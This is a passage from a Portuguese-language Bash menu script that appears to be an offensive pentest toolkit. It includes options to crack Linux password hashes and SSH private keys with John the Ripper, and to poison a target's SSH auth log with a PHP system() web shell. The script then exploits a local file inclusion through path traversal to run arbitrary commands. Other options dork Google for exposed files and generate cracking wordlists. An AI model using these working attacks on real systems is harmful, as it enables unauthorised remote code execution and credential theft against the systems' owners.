                          john hashlinux.txt --wordlist=$wordlist5
                          john hashlinux.txt --show 
            	    fi

          ;;

          "6") # Brute id_rsa SSH  
            	    echo "Digite o caminho do id_rsa ex: /home/user/.ssh/id_rsa "
                    read id_rsa 
                    echo "Digite o Caminho da Wordlist ou Enter"
                    read wordlista5
                    /usr/share/john/ssh2john.py $id_rsa > id_rsa.txt
                    if [ "$wordlista5" == "" ]
	  	    then
         	          john id_rsa.txt --wordlist=$wordlista
         	          john id_rsa.txt --show 	
	    	    else
                          john id_rsa.txt --wordlist=$wordlista5 
                          john id_rsa.txt --show
            	    fi
          ;;               
          "7") # Brute HASH linux 
            	    echo "Digite o caminho do HASH ex: /home/user/hash.tx"
                    read  hash2
                    echo "Digite o Caminho da Wordlist ou Enter"
                    read wordlista5
                    if [ "$wordlista5" == "" ]
	  	    then
         	          john $hash2 --wordlist=$wordlista
         	          john $hash2 --show 	
	    	    else
                          john $hash2 --wordlist=$wordlista5 
                          john $hash2 --show
            	    fi               
                         
          esac
	  ;;


###################################################################################################################
       28)  # Infecção de Log SSH - LFI linux 
           echo "1) Infectando Log SSH - LFI"
           echo "2) Explorando Infec Log SSH - LFI"
                   
           read -n1 -p 'Opção: ' resp12
           echo
	   case $resp12 in
	    
           "1") # Infectando Log SSH - LFI
		    echo "Digite o IP do Alvo"
                    read ip
                    echo "Aguarde..erre a senha 3 vezes.."
                    echo teste |  ssh '<?php system($_GET["sw1tchbl4d3"]); ?>'@$ip
	   ;;
	   
	   
	   "2") # Explorando Infec Log SSH - LFI

		    echo "Digite o local com LFI ex: domino/arquivo.php?="
		    read local2
                    echo "Digite o comando Ex: ls%20-la"
		    read comando
                    echo "Aguarde..."
                    mes=$(curl -s -X GET "$local2../../../../../../../var/log/auth.log" | awk 'NR==1{print $1 ; }') 
                    resposta=$(curl -s -X GET "$local2../../../../../../../var/log/auth.log&sw1tchbl4d3=$comando" | egrep -v "$mes|from" | sort | uniq )
		    echo "Comando executado..."
                    echo "-----------------------------------------------------------" 
                    echo "$resposta" 
                     
           esac
           ;;

###################################################################################################################
        29)  #  Google Hack 
            echo "1) Instalar o Lynx"
            echo "2) Google Hack"
            read -n1 -p 'Opção: ' resp11
            echo
	    case $resp11 in
	    
            "1") # Google Hack
                    apt update
            	    apt install lynx
            ;;

	    "2") # Google Hack
           	    echo "Digite o dominio"
            	    read dominio
            	    echo "Digite a extensao"
            	    read extensao
            	    lynx --dump "http://google.com/search?num=100&q=site:"$dominio"+ext:"$extensao"" | cut -d "=" -f2 | grep ".$extensao" | egrep -v "site|google" | sed s'/...$//'g
            esac
            ;;

###################################################################################################################
       30)  # Gerando Wordlista Personalizada 
            echo "Cuidado ao criar wordlist com muitos caracters, ficara enorme"
            echo 
            echo "1) Gerando wordlist letras minúsculas e maiúsculas"
	    echo "2) Gerando wordlist por sequencia de caracteres"
            echo "3) Gerando wordlist letras minúsculas/maiúsculas e números"
	    echo "4) Gerando wordlist letras minúsculas/maiúsculas"
            echo "5) Procurar Senha em Worlists"
            echo "6) Gerador de Senhas"
            echo "7) Mutação de Worlists"
            echo "8) Gerar wordlist por Dominio"

            read -n1 -p 'Opção: ' resp7
            echo
	    case $resp7 in
	    
	    "1") # Gerando Letras Minúsculas e Maiúsculas
            	    echo "Qual a quantidade de Caracteres na Wordlist ex: 6"
                    read quantidadecara
	            echo "Digite um nome para o Arquivo"
                    read nomearquivo
                    crunch $quantidadecara $quantidadecara -f $listaAlha mixalpha -o $nomearquivo.txt
            ;;
 
	    "2") # Criando WordList por Sequencia de Caracteres
           	    echo "Digite uma Palavra use @ por caractere a modificar Ex: @C@rl@s@@"
		    read palavra
            	    echo "Digite a Sequência Caracteres ex: 01234567890"
            	    read sequencia
            	    echo "Digite um nome para Wordlist"
                    read nomewordlist
                    echo -n $palavra > tamanhopalavra.txt
                    wc -c tamanhopalavra.txt | cut -d " " -f1 > numero.txt
                    numero=$(cat numero.txt)
                    crunch $numero $numero $sequencia -t $palavra -o $nomewordlist.txt                    
            ;;

            "3") # Gerando Letras Minúsculas , Maiúsculas e Números
            	    echo "Qual a quantidade de Caracteres na Wordlist ex: 6"
                    read quantidadecara
                    echo "Digite l=minuscula u=maiúscula ex: u"2
                    read mm
		    echo "Digite um nome para o Arquivo"
                    read nomearquivo
                    crunch $quantidadecara $quantidadecara -f $listaAlha "$mm""alpha-numeric" -o $nomearquivo.txt
             		 
            ;;

            "4") # Gerando Letras Minúsculas e Maiúsculas
            	    echo "Qual a quantidade de Caracteres na Wordlist ex: 6"
                    read quantidadecara
                    echo "Digite l=minuscula u=maiúscula (ex: u)"
                    read mm
		    echo "Digite um nome para o Arquivo"
                    read nomearquivo
                    crunch $quantidadecara $quantidadecara -f $listaAlha "$mm""alpha" -o $nomearquivo.txt

            ;;

            "5") # Procurar Senha em Worlists
                    echo "Digite a senha que Procura"
	            read senha
            	    echo "Aguarde..."
            	    grep -r "$senha" /usr/share/seclists/Passwords/* /usr/share/wordlists/* | cut -d ":" -f1  | sort | uniq 
            ;;

            "6") # Gerador de Senhas
           	    echo " 0 = Senhas sem numeral "
            	    echo " A = Senhas sem maiusculas"
            	    echo " c = Senhas com ao menos uma maiuscula"
            	    echo " n = Senhas numericas"
            	    echo " s = Senhas seguras"
	    	    echo " y = Senhas com simbolos"
	    	    echo " B = ambiguous"
            	    echo
            	    echo "Digite a quantidade de Caracteres Ex: 14"
            	    read qtdcarac
            	    echo "Digite a quantidade de Senhas a Criar Ex: 6"
            	    read qtdsenhas
            	    echo "Combine as opcoes Ex: Bcnsy"
            	    read opcoes
            	    echo "_____________________________________________"
            	    pwgen -$opcoes $qtdcarac $qtdsenhas 

            ;;

            "7") # Mutação de Worlists - OK
            	    echo "Digite o caminho da wordlista para mutação"
	    	    read mutacao
            	    echo "Digite o nome para Nova Wordlist"
            	    read wordlistmutacao
           	    john --wordlist=$mutacao --rules --stdout > $wordlistmutacao.txt

            ;;
 
            "8") # Gerar wordlist por Dominio - OK testar dnvo
            	    echo "Digite o dominio base da Wordlist ex: https://www.google.com"
            	    read url
            	    echo "Digite um nome para sua Wordlist ex: lista"
            	    read wordlista
            	    cewl $url -m 4 -d 5 > $wordlista.txt
            	    cat $wordlista.txt

            esac                           
            ;;


###################################################################################################################
        0)  # Finalizar script
            echo 'Saindo...'
            exit 0
            ;;

        *)  # Opção inválida. (nenhuma das opções anteriores).
            # O comando break não é executado para que o fluxo do script
            # permaneça preso ao menu, forçando o usuário a selecionar uma
            # opção válida.

            # Imprimindo mensagem de erro.
            echo 'Opção seleciona é inválida.'
            echo
            ;;
    esac
done
